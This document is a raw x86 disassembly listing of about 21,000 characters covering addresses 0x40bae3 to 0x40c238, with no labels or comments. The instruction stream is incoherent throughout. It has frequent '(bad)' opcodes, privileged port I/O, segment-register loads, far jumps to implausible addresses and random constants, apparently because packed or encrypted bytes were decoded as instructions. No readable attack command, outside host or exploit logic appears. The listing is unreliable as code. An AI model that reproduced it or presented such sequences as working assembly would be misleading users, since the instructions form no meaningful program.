  40bae3:	mov    dl,BYTE PTR [ebp-0x25]
  40bae6:	push   ebx
  40bae7:	mov    ?,esp
  40bae9:	xlat   BYTE PTR ds:[ebx]
  40baea:	mov    bl,0x36
  40baec:	jecxz  0x40ba85
  40baee:	push   eax
  40baef:	pop    esi
  40baf0:	rcr    BYTE PTR [esi],cl
  40baf2:	scas   eax,DWORD PTR es:[edi]
  40baf3:	gs xor esp,DWORD PTR fs:[eax]
  40baf7:	xor    dh,BYTE PTR [ebx-0x107fbcef]
  40bafd:	jg     0x40bb43
  40baff:	aaa    
  40bb00:	pusha  
  40bb01:	xor    eax,0x7cccd98a
  40bb06:	jp     0x40bb33
  40bb08:	lods   al,BYTE PTR ds:[esi]
  40bb09:	out    0x95,al
  40bb0b:	xchg   DWORD PTR [edx],edx
  40bb0d:	cmp    BYTE PTR [eax-0x24802d6a],bl
  40bb13:	cmp    DWORD PTR [ecx],0xffffff96
  40bb16:	xor    dh,BYTE PTR [ebx+0x1a250ad2]
  40bb1c:	sub    DWORD PTR [edi+0x1b],ebx
  40bb1f:	je     0x40bac2
  40bb21:	push   ss
  40bb22:	mov    DWORD PTR [edx+ebp*2],ecx
  40bb25:	add    DWORD PTR [ebp-0x37d5273f],0xffffff82
  40bb2c:	sar    BYTE PTR [eax+0x65],cl
  40bb2f:	ret    
  40bb30:	or     eax,0x1b10b0e4
  40bb35:	adc    ebx,ecx
  40bb37:	loop   0x40baf0
  40bb39:	hlt    
  40bb3a:	arpl   di,ax
  40bb3c:	mov    edi,0x78f18474
  40bb41:	sbb    bl,BYTE PTR [eax+0x5]
  40bb44:	out    dx,eax
  40bb45:	jne    0x40bbb5
  40bb47:	mov    es,WORD PTR [edi]
  40bb49:	(bad)  
  40bb4a:	popf   
  40bb4b:	and    DWORD PTR [edx],esp
  40bb4d:	mov    cl,0x93
  40bb4f:	stos   DWORD PTR es:[edi],eax
  40bb50:	shr    BYTE PTR [ecx+0x36],cl
  40bb53:	push   esp
  40bb54:	imul   esi,DWORD PTR [ebp+0x1e46af9f],0x7c533840
  40bb5e:	sbb    eax,0x85d7a4d5
  40bb63:	xchg   esi,eax
  40bb64:	(bad)  
  40bb65:	clc    
  40bb66:	loope  0x40bb88
  40bb68:	int    0x60
  40bb6a:	sub    BYTE PTR [edx-0x607e7524],bl
  40bb70:	push   ecx
  40bb71:	xchg   ebp,eax
  40bb72:	in     eax,0xdd
  40bb74:	inc    ebx
  40bb75:	ins    DWORD PTR es:[edi],dx
  40bb76:	mov    edi,0x7e39d2e0
  40bb7b:	jns    0x40bbf3
  40bb7d:	fsubr  DWORD PTR [ecx-0x76]
  40bb80:	xchg   esp,eax
  40bb81:	adc    al,0x97
  40bb83:	sbb    cl,bl
  40bb85:	cmp    ah,BYTE PTR [ebp+0xe]
  40bb88:	fadd   DWORD PTR [ecx-0x572f3afa]
  40bb8e:	sbb    esi,esi
  40bb90:	push   cs
  40bb91:	jno    0x40bb65
  40bb93:	inc    eax
  40bb94:	popf   
  40bb95:	jmp    edx
  40bb97:	mov    gs,eax
  40bb99:	cmp    dh,BYTE PTR [esi-0x5b506425]
  40bb9f:	pusha  
  40bba0:	shl    BYTE PTR [ecx],0x72
  40bba3:	push   esi
  40bba4:	adc    bh,BYTE PTR [ebp-0x6ffac9e1]
  40bbaa:	xor    bl,BYTE PTR [edi+0x2d34e66b]
  40bbb0:	mov    dl,0x23
  40bbb2:	stos   BYTE PTR es:[edi],al
  40bbb3:	sub    dl,BYTE PTR [edx]
  40bbb5:	addr16 mov esp,ebp
  40bbb8:	add    BYTE PTR [edi+0x28],ch
  40bbbb:	lods   eax,DWORD PTR ds:[esi]
  40bbbc:	out    0x99,al
  40bbbe:	pop    ebx
  40bbbf:	and    eax,DWORD PTR [ebx]
  40bbc1:	adc    ebp,ebx
  40bbc3:	retf   
  40bbc4:	jno    0x40bbed
  40bbc6:	xchg   DWORD PTR [edi-0x17],edi
  40bbc9:	dec    esi
  40bbca:	test   ch,dh
  40bbcc:	sti    
  40bbcd:	stos   DWORD PTR es:[edi],eax
  40bbce:	mov    ch,0xd0
  40bbd0:	pop    ecx
  40bbd1:	adc    al,0x45
  40bbd3:	mov    ?,WORD PTR [ecx+0x3d]
  40bbd6:	jne    0x40bc55
  40bbd8:	sbb    cl,BYTE PTR [ecx]
  40bbda:	lea    edi,[edx-0x3597774e]
  40bbe0:	loopne 0x40bb89
  40bbe2:	leave  
  40bbe3:	ds (bad) 
  40bbe5:	jecxz  0x40bb7f
  40bbe7:	addr16 xchg edx,eax
  40bbe9:	std    
  40bbea:	inc    ebx
  40bbeb:	outs   dx,BYTE PTR ds:[esi]
  40bbec:	fwait
  40bbed:	jg     0x40bc35
  40bbef:	mov    ?,WORD PTR [edx+esi*8]
  40bbf2:	(bad)  
  40bbf3:	in     eax,0xbf
  40bbf5:	pop    ss
  40bbf6:	pop    esi
  40bbf7:	(bad)  
  40bbf9:	sahf   
  40bbfa:	add    dh,bl
  40bbfc:	inc    esi
  40bbfd:	xchg   ecx,eax
  40bbfe:	rcr    bh,0xc4
  40bc01:	cmp    DWORD PTR [eax-0x2a],esi
  40bc04:	sub    eax,0x72bf1698
  40bc09:	hlt    
  40bc0a:	inc    ebp
  40bc0b:	mov    eax,ds:0x7ffde3e
  40bc10:	jns    0x40bc82
  40bc12:	sahf   
  40bc13:	rsqrtps xmm0,XMMWORD PTR [ebp+0x174a8df5]
  40bc1a:	dec    edi
  40bc1b:	cwde   
  40bc1c:	dec    esp
  40bc1d:	jp     0x40bbe6
  40bc1f:	fnsave [edx]
  40bc21:	mov    eax,0x8bfc148
  40bc26:	test   BYTE PTR [eax],dl
  40bc28:	and    al,ah
  40bc2a:	fiadd  WORD PTR ds:0xea6b5676
  40bc30:	rcl    BYTE PTR [ecx],1
  40bc32:	inc    eax
  40bc33:	setge  cl
  40bc36:	and    edi,DWORD PTR [edx+0x31]
  40bc39:	dec    edi
  40bc3a:	test   bl,cl
  40bc3c:	sbb    ah,bh
  40bc3e:	arpl   WORD PTR [ebx+ebp*8+0x7f],bp
  40bc42:	mov    esp,0x873ea395
  40bc47:	clc    
  40bc48:	push   edx
  40bc49:	mov    dl,0xfc
  40bc4b:	retf   0xebc6
  40bc4e:	test   DWORD PTR [ebx+0x55b80121],esi
  40bc54:	loop   0x40bcb3
  40bc56:	test   eax,0x6e274d8e
  40bc5b:	cs sub eax,0xd3aace97
  40bc61:	cmp    ebx,esi
  40bc63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc64:	lock into 
  40bc66:	inc    ebp
  40bc67:	adc    BYTE PTR [esi-0x549a1fb4],dl
  40bc6d:	adc    DWORD PTR [esi-0x6f72f71a],esp
  40bc73:	xchg   ah,al
  40bc75:	iret   
  40bc76:	mov    ch,al
  40bc78:	leave  
  40bc79:	push   cs
  40bc7a:	xchg   ebx,eax
  40bc7b:	shl    BYTE PTR [ebp+0x2480a53e],0xe1
  40bc82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc83:	xchg   ebp,eax
  40bc84:	mov    eax,ds:0xd3b1dada
  40bc89:	mov    eax,0xf1014caf
  40bc8e:	aam    0x29
  40bc90:	rcl    BYTE PTR [ebx],cl
  40bc92:	cmc    
  40bc93:	inc    edi
  40bc94:	ret    
  40bc95:	adc    eax,0x4d758e3
  40bc9a:	and    al,BYTE PTR [edx]
  40bc9c:	sti    
  40bc9d:	adc    DWORD PTR [eax+0x25d16b6a],ebx
  40bca3:	dec    ecx
  40bca4:	lods   eax,DWORD PTR ds:[esi]
  40bca5:	out    0x73,al
  40bca7:	fisubr WORD PTR [esi]
  40bca9:	fidiv  WORD PTR [edx]
  40bcab:	cli    
  40bcac:	jmp    0x40bd0a
  40bcae:	push   esp
  40bcaf:	scas   al,BYTE PTR es:[edi]
  40bcb0:	sbb    ebp,DWORD PTR [esi]
  40bcb2:	or     al,0xe2
  40bcb4:	xchg   DWORD PTR [ecx],edx
  40bcb6:	leave  
  40bcb7:	ret    0x96d
  40bcba:	dec    esp
  40bcbb:	jmp    0x40bcec
  40bcbd:	dec    ebp
  40bcbe:	test   bh,ch
  40bcc0:	pop    ss
  40bcc1:	aas    
  40bcc2:	in     eax,0xf5
  40bcc4:	xor    eax,DWORD PTR [ecx+0x5a]
  40bcc7:	mov    ds,WORD PTR [ebp+0x68abe1d8]
  40bccd:	sbb    eax,0x79d2d7e7
  40bcd2:	rcr    BYTE PTR [edx],0x8b
  40bcd5:	popa   
  40bcd6:	fstp   QWORD PTR [eax+ebp*1+0x1e]
  40bcda:	ja     0x40bc86
  40bcdc:	mov    esi,0x7be9225d
  40bce1:	xchg   ebx,eax
  40bce2:	inc    ebp
  40bce3:	sahf   
  40bce4:	lahf   
  40bce5:	push   ebp
  40bce6:	loope  0x40bc96
  40bce8:	inc    eax
  40bce9:	adc    eax,0xe0c89fe1
  40bcee:	pop    ds
  40bcef:	inc    esi
  40bcf0:	mov    dl,0x0
  40bcf2:	add    DWORD PTR [ebp+0x24924c71],edx
  40bcf8:	rcr    BYTE PTR [esi+eiz*1-0x4c39194],0x4
  40bd00:	cmp    BYTE PTR [ecx+0x4f],dl
  40bd03:	repnz push es
  40bd05:	in     al,0x3d
  40bd07:	(bad)  
  40bd08:	loop   0x40bd19
  40bd0a:	sti    
  40bd0b:	in     eax,0xf1
  40bd0d:	add    ah,BYTE PTR [ebp+eiz*4-0x5193db10]
  40bd14:	rol    cl,cl
  40bd16:	lds    edx,FWORD PTR [esi+ebx*1+0x4a]
  40bd1a:	push   eax
  40bd1b:	in     al,0x1d
  40bd1d:	and    eax,0x31d23f59
  40bd22:	inc    ebx
  40bd23:	push   edi
  40bd24:	or     al,0xc9
  40bd26:	scas   al,BYTE PTR es:[edi]
  40bd27:	popf   
  40bd28:	rcl    BYTE PTR [edx],cl
  40bd2a:	xor    eax,0x3c984395
  40bd2f:	fcmovu st,st(3)
  40bd31:	adc    DWORD PTR [eax],ecx
  40bd33:	adc    al,0x59
  40bd35:	arpl   WORD PTR [edx-0x3132c36],ax
  40bd3b:	mov    esp,0x6edc4c85
  40bd40:	mov    BYTE PTR [edi+0x605f555c],al
  40bd46:	adc    ebx,DWORD PTR [esi]
  40bd48:	clc    
  40bd49:	daa    
  40bd4a:	cmp    esi,DWORD PTR ds:0x7e0afe66
  40bd50:	jecxz  0x40bdbd
  40bd52:	adc    BYTE PTR [edx+0x19],ch
  40bd55:	push   ecx
  40bd56:	scas   eax,DWORD PTR es:[edi]
  40bd57:	imul   edx,ecx,0x43a65915
  40bd5d:	add    eax,0x91332440
  40bd62:	test   edi,0xb06f5dfe
  40bd68:	jnp    0x40bd38
  40bd6a:	lea    esp,gs:[edx-0x17]
  40bd6e:	imul   edi,DWORD PTR [ebx+0xb5e4a4d],0xffffffd2
  40bd75:	int    0x75
  40bd77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd78:	xchg   ebp,eax
  40bd79:	(bad)  
  40bd7b:	and    ch,BYTE PTR [edx+0x25afd505]
  40bd81:	push   ecx
  40bd82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd83:	mov    ah,0x90
  40bd85:	test   eax,0x23d212ac
  40bd8a:	sub    ah,BYTE PTR [eax+0x3c]
  40bd8d:	push   0xffffffef
  40bd8f:	xabort 0x75
  40bd92:	les    ecx,FWORD PTR [esi-0x46eac91a]
  40bd98:	xor    ebp,esi
  40bd9a:	idiv   DWORD PTR [esi-0x18ce5c2e]
  40bda0:	jmp    0x40bd50
  40bda2:	test   BYTE PTR [eax-0x4d95d873],bl
  40bda8:	rol    BYTE PTR [edx],cl
  40bdaa:	icebp  
  40bdab:	adc    DWORD PTR [ebx+ebp*1+0x5],0xfeb0d2b1
  40bdb3:	aas    
  40bdb4:	sbb    ah,BYTE PTR [esi-0x1a]
  40bdb7:	xchg   BYTE PTR ds:0xd3cf3211,cl
  40bdbd:	bound  edx,QWORD PTR [edi]
  40bdbf:	cmp    eax,0xfb85a61d
  40bdc4:	cmp    al,0xa3
  40bdc6:	addr16 retf 
  40bdc8:	(bad)  
  40bdc9:	rcl    BYTE PTR [eax-0x72],cl
  40bdcc:	mov    ebp,0x9751883b
  40bdd1:	iret   
  40bdd2:	push   0xb729d2aa
  40bdd7:	xor    cl,BYTE PTR [eax+0x23]
  40bdda:	stc    
  40bddb:	push   0x30
  40bddd:	fld    DWORD PTR [eax+0x5addd24f]
  40bde3:	inc    ebx
  40bde4:	sub    esi,DWORD PTR [edx-0x4d]
  40bde7:	imul   ebp,edx,0x781848fd
  40bded:	mov    ch,0xe7
  40bdef:	mov    ds,WORD PTR [ecx-0x4a]
  40bdf2:	imul   eax,DWORD PTR [edi+ebx*4],0x61
  40bdf6:	inc    ebx
  40bdf7:	push   es
  40bdf8:	cmp    al,BYTE PTR [edx]
  40bdfa:	mov    al,0xd8
  40bdfc:	in     eax,0x11
  40bdfe:	mov    ?,edi
  40be00:	test   BYTE PTR [ecx+ecx*1],cl
  40be03:	int    0xd2
  40be05:	in     al,dx
  40be06:	xor    BYTE PTR [ecx-0x741cf27d],dh
  40be0c:	push   eax
  40be0d:	in     al,dx
  40be0e:	and    BYTE PTR [esi+0x30dd5a45],cl
  40be14:	pop    esi
  40be15:	sti    
  40be16:	rol    BYTE PTR [edi-0x2e],cl
  40be19:	ins    BYTE PTR es:[edi],dx
  40be1a:	inc    ecx
  40be1b:	ins    BYTE PTR es:[edi],dx
  40be1c:	and    BYTE PTR [ebp+0x113e2784],dh
  40be22:	lods   al,BYTE PTR ds:[esi]
  40be23:	sar    BYTE PTR ds:0x7dfcf41f,1
  40be29:	add    eax,DWORD PTR [ebp-0x4f9551e4]
  40be2f:	dec    ebp
  40be30:	out    0xd5,eax
  40be32:	fs mov ds,edi
  40be35:	jle    0x40be9d
  40be37:	sub    BYTE PTR [ecx+0x1],cl
  40be3a:	cmp    edx,edi
  40be3c:	ror    eax,0x0
  40be3f:	mov    al,0x26
  40be41:	ins    DWORD PTR es:[edi],dx
  40be42:	mov    ch,BYTE PTR [ecx]
  40be44:	lahf   
  40be45:	push   ecx
  40be46:	leave  
  40be47:	or     bh,0xf1
  40be4a:	in     eax,0x68
  40be4c:	push   esi
  40be4d:	add    al,cl
  40be4f:	clc    
  40be50:	xor    al,0x51
  40be52:	xor    BYTE PTR [esi+esi*1],ah
  40be55:	jns    0x40bebb
  40be57:	push   cs
  40be58:	dec    edx
  40be59:	ss test ebp,ecx
  40be5c:	xchg   esp,eax
  40be5d:	xor    al,0x9b
  40be5f:	inc    eax
  40be60:	and    bl,BYTE PTR [bx-0x2876]
  40be65:	(bad)  
  40be66:	xchg   edi,eax
  40be67:	shl    BYTE PTR [ebx-0x58311f94],cl
  40be6d:	daa    
  40be6e:	nop
  40be6f:	(bad)  
  40be70:	lods   eax,DWORD PTR ds:[esi]
  40be71:	pop    esp
  40be72:	(bad)
  40be75:	push   ss
  40be76:	push   esi
  40be77:	fld    QWORD PTR ss:[esi+0x22f8e9d]
  40be7e:	ja     0x40be3f
  40be80:	mov    dl,0xf3
  40be82:	das    
  40be83:	jmp    0xcb845558
  40be88:	aas    
  40be89:	rcr    edx,1
  40be8b:	push   edx
  40be8c:	xchg   DWORD PTR [ebp+0x50b18cc7],ebp
  40be92:	lock cwde 
  40be94:	jb     0x40bef1
  40be96:	in     al,0xcc
  40be98:	cmp    bl,BYTE PTR [ebx+edx*8]
  40be9b:	gs shr dh,cl
  40be9e:	mov    dh,0x79
  40bea0:	fcmove st,st(7)
  40bea2:	xchg   edx,eax
  40bea3:	pop    esi
  40bea4:	push   ds
  40bea5:	in     eax,dx
  40bea6:	dec    edi
  40bea7:	mov    ss,WORD PTR [ecx]
  40bea9:	or     bh,dl
  40beab:	ins    DWORD PTR es:[edi],dx
  40beac:	and    eax,0xc7831446
  40beb1:	or     DWORD PTR [edx-0x62fe2d12],ecx
  40beb7:	jne    0x40be50
  40beb9:	push   0x4a428e0d
  40bebe:	cmc    
  40bebf:	lock lods eax,DWORD PTR ds:[esi]
  40bec1:	stc    
  40bec2:	push   cs
  40bec3:	jae    0x40bea2
  40bec5:	imul   edi,DWORD PTR [eax+0x68],0xffffffd2
  40bec9:	jl     0x40be70
  40becb:	ins    BYTE PTR es:[edi],dx
  40becc:	pop    esi
  40becd:	call   0xdd4751f8
  40bed2:	jmp    0x97a0:0x5580a71c
  40bed9:	dec    edi
  40beda:	push   eax
  40bedb:	sub    edx,edx
  40bedd:	add    eax,0x3a9fa7e8
  40bee2:	pop    ss
  40bee3:	aad    0xc1
  40bee5:	mov    ecx,0xeecc8eca
  40beea:	lods   eax,DWORD PTR ds:[esi]
  40beeb:	mov    WORD PTR [edi+0x65],ss
  40beee:	fwait
  40beef:	adc    dl,0x61
  40bef2:	sbb    esi,DWORD PTR [ebx+ebp*8]
  40bef5:	rol    DWORD PTR [ecx-0x52],0xb9
  40bef9:	add    al,0xf8
  40befb:	ins    DWORD PTR es:[edi],dx
  40befc:	inc    esp
  40befd:	pop    esi
  40befe:	mov    DWORD PTR [ebx+0x29],esi
  40bf01:	sbb    eax,0xce0577d
  40bf06:	ds or  eax,0xc66c8861
  40bf0c:	pop    ebp
  40bf0d:	call   FWORD PTR [ebx+edx*4-0x26]
  40bf11:	(bad)  
  40bf12:	mov    esp,0x6d889ff7
  40bf17:	mov    dh,0x5e
  40bf19:	mov    bh,0x88
  40bf1b:	mov    edi,0xadf42e40
  40bf20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf21:	lods   al,BYTE PTR ds:[esi]
  40bf22:	jne    0x40bf34
  40bf24:	cld    
  40bf25:	adc    eax,0x43d88ed8
  40bf2a:	sbb    ch,BYTE PTR [edx+eiz*2+0x25]
  40bf2e:	xchg   edi,eax
  40bf2f:	ret    0x42e5
  40bf32:	jmp    0x74f5c84e
  40bf37:	inc    ebp
  40bf38:	xor    dh,BYTE PTR [edx+0x11388022]
  40bf3e:	fisub  DWORD PTR [esi+0x78]
  40bf41:	sbb    DWORD PTR [eax-0x7ae3a439],0xffffffae
  40bf48:	aad    0xcf
  40bf4a:	add    DWORD PTR [edi-0x72c92207],0x591bb3a4
  40bf54:	pop    eax
  40bf55:	paddb  mm6,QWORD PTR [eax-0x1f]
  40bf59:	cmc    
  40bf5a:	xchg   BYTE PTR [ebp-0x65a07767],cl
  40bf60:	sub    al,0xd2
  40bf62:	mov    cl,0x24
  40bf64:	xchg   edx,eax
  40bf65:	cmp    eax,DWORD PTR [ebx-0x11e82df2]
  40bf6b:	sbb    eax,0x8faed2c4
  40bf70:	lods   eax,DWORD PTR ds:[esi]
  40bf71:	or     esi,DWORD PTR [esi]
  40bf73:	mov    edi,0xce5d6689
  40bf78:	pop    esp
  40bf79:	jns    0x40bf5c
  40bf7b:	mov    ?,WORD PTR [eax]
  40bf7d:	cmp    cl,dh
  40bf7f:	sub    eax,0x291d301c
  40bf84:	rcl    BYTE PTR [edi+0x3b],cl
  40bf87:	mov    ds:0xa31f7ecb,eax
  40bf8c:	mov    ecx,0xa6a56411
  40bf91:	loopne 0x40bf7c
  40bf93:	inc    DWORD PTR [ebx-0x65]
  40bf96:	ins    DWORD PTR es:[edi],dx
  40bf97:	jb     0x40bf5f
  40bf99:	fwait
  40bf9a:	pop    es
  40bf9b:	(bad)  
  40bf9c:	xchg   edx,eax
  40bf9d:	dec    ebp
  40bf9e:	or     esi,DWORD PTR [eax]
  40bfa0:	es mov dh,0xe8
  40bfa3:	lea    esp,[edi+0x46d7c74]
  40bfa9:	(bad)  
  40bfab:	fisubr WORD PTR [edx-0x361016d3]
  40bfb1:	aad    0x46
  40bfb3:	cmp    eax,0x97044705
  40bfb8:	inc    ebx
  40bfb9:	push   DWORD PTR [edx]
  40bfbb:	lea    edx,[ebx]
  40bfbd:	fisubr DWORD PTR [edi+0x48]
  40bfc0:	push   edx
  40bfc1:	data16 cmp bh,dh
  40bfc4:	out    0x16,eax
  40bfc6:	outs   dx,BYTE PTR ds:[esi]
  40bfc7:	mov    ?,WORD PTR [edx]
  40bfc9:	pop    esp
  40bfca:	lods   al,BYTE PTR ds:[esi]
  40bfcb:	mov    BYTE PTR [ecx],ah
  40bfcd:	mov    ebx,0x29b8ecb
  40bfd2:	pop    ss
  40bfd3:	pop    ds
  40bfd4:	shl    DWORD PTR [edx-0x1e],1
  40bfd7:	xchg   ebx,eax
  40bfd8:	test   eax,0xf01ea277
  40bfdd:	inc    edi
  40bfde:	(bad)  
  40bfdf:	inc    DWORD PTR [edi+0x5f8ec13f]
  40bfe5:	out    dx,al
  40bfe6:	dec    ebp
  40bfe7:	push   edi
  40bfe8:	push   ecx
  40bfe9:	inc    edx
  40bfea:	mov    cl,0x86
  40bfec:	sar    DWORD PTR [ebp+0x6256a2e1],1
  40bff2:	add    al,0x1c
  40bff4:	cld    
  40bff5:	mov    edi,0x11b2f945
  40bffa:	xor    eax,0x1dd60750
  40bfff:	aam    0x4f
  40c001:	pop    ds
  40c002:	cld    
  40c003:	fadd   QWORD PTR [eax+0x3d]
  40c006:	in     al,0xe
  40c008:	jnp    0x40bfa6
  40c00a:	int3   
  40c00b:	mov    al,0x3b
  40c00d:	adc    DWORD PTR [esi+0x9c6b756],esp
  40c013:	sub    DWORD PTR [eax-0x7ec37a0e],ebx
  40c019:	dec    esi
  40c01a:	xor    al,BYTE PTR [ecx-0x64]
  40c01d:	test   DWORD PTR [ebx-0x72],0x2cf6d90f
  40c024:	pop    edi
  40c025:	xchg   esp,eax
  40c026:	sbb    eax,ecx
  40c028:	sar    DWORD PTR [esi],cl
  40c02a:	outs   dx,BYTE PTR ds:[esi]
  40c02b:	mov    BYTE PTR [esi-0x75a1aad7],dh
  40c031:	push   edx
  40c032:	dec    ebp
  40c033:	fs inc eax
  40c035:	push   ds
  40c036:	enter  0x4ef9,0x86
  40c03a:	mov    BYTE PTR [ebp-0x7f7a58f5],dh
  40c040:	push   edi
  40c041:	jmp    0xfbc6b2e9
  40c046:	add    esi,esp
  40c048:	icebp  
  40c049:	adc    DWORD PTR [edi+0x38],ebx
  40c04c:	or     BYTE PTR [eax-0x48],0x8f
  40c050:	inc    edi
  40c051:	push   ss
  40c052:	out    dx,eax
  40c053:	in     eax,dx
  40c054:	jge    0x40c0b2
  40c056:	add    al,0x73
  40c058:	(bad)  
  40c059:	clc    
  40c05a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c05b:	aaa    
  40c05c:	retf   0x9e11
  40c05f:	and    bl,BYTE PTR [ebp-0x12]
  40c062:	jae    0x40c05f
  40c064:	push   edi
  40c065:	and    al,0x59
  40c067:	xor    eax,0x7f3c4ed2
  40c06c:	dec    edi
  40c06d:	sub    BYTE PTR [ecx+0x33],dl
  40c070:	loop   0x40c0d5
  40c072:	cmp    cl,BYTE PTR [ebp+0x62ca460c]
  40c078:	ret    
  40c079:	shr    BYTE PTR [eax+0x5c],1
  40c07c:	shl    BYTE PTR [ebx+esi*4],cl
  40c07f:	icebp  
  40c080:	add    dl,BYTE PTR [esi+0x110f64f1]
  40c086:	or     ah,BYTE PTR ds:0xd1b94e48
  40c08c:	pop    sp
  40c08e:	test   BYTE PTR [eax-0x3a04162c],bl
  40c094:	or     ecx,ebx
  40c096:	fst    QWORD PTR [esi-0x5b]
  40c099:	jp     0x40c01f
  40c09b:	iret   
  40c09c:	inc    edi
  40c09d:	sub    al,0xa
  40c09f:	mov    dl,0xa6
  40c0a1:	test   DWORD PTR cs:[edi+ecx*2+0x3],eax
  40c0a6:	fwait
  40c0a7:	mov    al,0x1c
  40c0a9:	imul   ebx,DWORD PTR [ecx-0x73],0xbcfc915a
  40c0b0:	push   ds
  40c0b1:	pop    edi
  40c0b2:	ss icebp 
  40c0b4:	das    
  40c0b5:	push   edx
  40c0b6:	test   BYTE PTR [ebx+0xd],bl
  40c0b9:	mov    ss:0xdcdc3584,eax
  40c0bf:	mov    al,0x1f
  40c0c1:	cmc    
  40c0c2:	and    BYTE PTR [esi+0x4b7abfbf],cl
  40c0c8:	ins    DWORD PTR es:[edi],dx
  40c0c9:	(bad)  
  40c0ca:	mov    ch,dl
  40c0cc:	(bad)
  40c0cf:	into   
  40c0d0:	stc    
  40c0d1:	mov    dh,0x9a
  40c0d3:	rcr    BYTE PTR [edx-0x6c715d14],0x9a
  40c0da:	(bad)  
  40c0db:	push   edi
  40c0dc:	xor    eax,0xd21f5335
  40c0e1:	and    eax,0x77ccc179
  40c0e6:	test   eax,0x6f11e57c
  40c0eb:	popf   
  40c0ec:	test   esi,esi
  40c0ee:	jnp    0x40c0cc
  40c0f0:	xor    DWORD PTR [edi-0x79],edx
  40c0f3:	dec    esi
  40c0f4:	jno    0x40c090
  40c0f6:	lods   eax,DWORD PTR ds:[esi]
  40c0f7:	sub    eax,0x5d71e172
  40c0fc:	das    
  40c0fd:	push   ds
  40c0fe:	cmp    eax,0x760daa4
  40c103:	lahf   
  40c104:	(bad)  
  40c105:	jnp    0x40c08b
  40c107:	stos   DWORD PTR es:[edi],eax
  40c108:	push   ecx
  40c109:	push   ebx
  40c10a:	inc    esi
  40c10b:	cmp    DWORD PTR [edx-0x12],ebx
  40c10e:	xchg   ebp,eax
  40c10f:	mov    dl,BYTE PTR [edi-0x74]
  40c112:	mov    edi,0xce6e758e
  40c117:	jbe    0x40c0ab
  40c119:	call   0x2e74:0x5feac5fc
  40c120:	in     eax,0x23
  40c122:	push   ebx
  40c123:	inc    ebx
  40c124:	aaa    
  40c125:	adc    DWORD PTR [edi+0x45060e74],eax
  40c12b:	fist   DWORD PTR [esi+edi*2]
  40c12e:	test   BYTE PTR [ebp+0x4f8b0530],ch
  40c134:	pop    ecx
  40c135:	in     al,0x2a
  40c137:	mov    fs,WORD PTR [edx+0x6c]
  40c13a:	dec    esp
  40c13b:	sbb    ebx,DWORD PTR [edx-0x2f4b2dfe]
  40c141:	hlt    
  40c142:	popa   
  40c143:	enter  0x71c4,0x66
  40c147:	(bad)  
  40c148:	js     0x40c159
  40c14a:	clc    
  40c14b:	(bad)  
  40c14c:	pop    ecx
  40c14d:	push   ds
  40c14e:	lods   eax,DWORD PTR ds:[esi]
  40c14f:	mov    bh,0x4e
  40c151:	dec    ebx
  40c152:	and    esi,edx
  40c154:	sbb    dl,ch
  40c156:	test   DWORD PTR [ebx-0xc],edi
  40c159:	aaa    
  40c15a:	dec    edi
  40c15b:	fist   DWORD PTR [esi+0x7063b284]
  40c161:	push   ds
  40c162:	adc    al,0x19
  40c164:	and    al,0x8a
  40c166:	inc    edx
  40c167:	pop    eax
  40c168:	outs   dx,BYTE PTR ds:[esi]
  40c169:	rol    DWORD PTR [ebp+0x68ebddbf],1
  40c16f:	fst    QWORD PTR [ebx-0x5e9c6397]
  40c175:	pextrw eax,(bad),0xc5
  40c177:	add    eax,0xc9571f51
  40c17c:	mov    edx,0xaae652ec
  40c181:	(bad)  
  40c183:	pop    es
  40c184:	sbb    ah,0x45
  40c187:	test   eax,0x81b5712d
  40c18c:	mov    BYTE PTR [edx],al
  40c18e:	sub    edi,DWORD PTR [edi+0x44c2513b]
  40c194:	inc    edx
  40c195:	(bad)  
  40c196:	cmp    eax,0xd762d26b
  40c19b:	push   0xa6094abb
  40c1a0:	test   al,0x11
  40c1a2:	jp     0x40c198
  40c1a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1a5:	adc    ecx,DWORD PTR [ecx+ecx*2]
  40c1a8:	mov    eax,ds:0xd2d357af
  40c1ad:	or     DWORD PTR [ecx-0x5398f9e9],eax
  40c1b3:	pop    esi
  40c1b4:	outs   dx,BYTE PTR ds:[esi]
  40c1b5:	jb     0x40c216
  40c1b7:	lea    ebp,[ecx+0x2a736d77]
  40c1bd:	mov    bh,0xb6
  40c1bf:	fidiv  DWORD PTR [edx-0x56]
  40c1c2:	test   DWORD PTR [edi+0x49],ebx
  40c1c5:	sbb    edi,DWORD PTR [eax+0x76]
  40c1c8:	stos   BYTE PTR es:[edi],al
  40c1c9:	mov    edi,0xd3028ea4
  40c1ce:	add    DWORD PTR [edx+0xcce3d8],eax
  40c1d4:	ds inc esi
  40c1d6:	out    dx,al
  40c1d7:	xchg   ebx,eax
  40c1d8:	jae    0x40c220
  40c1da:	inc    esp
  40c1db:	inc    eax
  40c1dc:	mov    ebp,0x5f18a4a7
  40c1e1:	adc    al,0x3c
  40c1e3:	mov    ebp,0x3465ea23
  40c1e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1e9:	dec    esi
  40c1ea:	(bad)  
  40c1eb:	(bad)  
  40c1ed:	out    dx,eax
  40c1ee:	mov    eax,0x6de9d2a7
  40c1f3:	push   ebx
  40c1f4:	mov    DWORD PTR [ebp+0xb],ebp
  40c1f7:	(bad)  
  40c1f8:	repnz cmp ch,dh
  40c1fb:	push   0xffffffd0
  40c1fd:	pop    ebx
  40c1fe:	xor    al,0x6d
  40c200:	ja     0x40c1a4
  40c202:	test   DWORD PTR [edi],edi
  40c204:	sbb    al,0xb5
  40c206:	gs jb  0x40c1eb
  40c209:	push   edi
  40c20a:	add    al,0x97
  40c20c:	and    esp,DWORD PTR [edx+0x4ca549ec]
  40c212:	test   dh,0x54
  40c215:	mov    ds,WORD PTR [eax+0x4735d251]
  40c21b:	adc    eax,0xe618d5cc
  40c220:	bound  ebx,QWORD PTR ds:0xfc7e3f40
  40c226:	daa    
  40c227:	outs   dx,BYTE PTR ds:[esi]
  40c228:	(bad)  
  40c229:	(bad)  
  40c22a:	test   DWORD PTR [ebp-0x2e],0xe7d58d7
  40c231:	sub    edi,edi
  40c233:	popf   
  40c234:	push   es
  40c235:	jge    0x40c1bc
  40c237:	in     al,dx
  40c238:	push   ebx
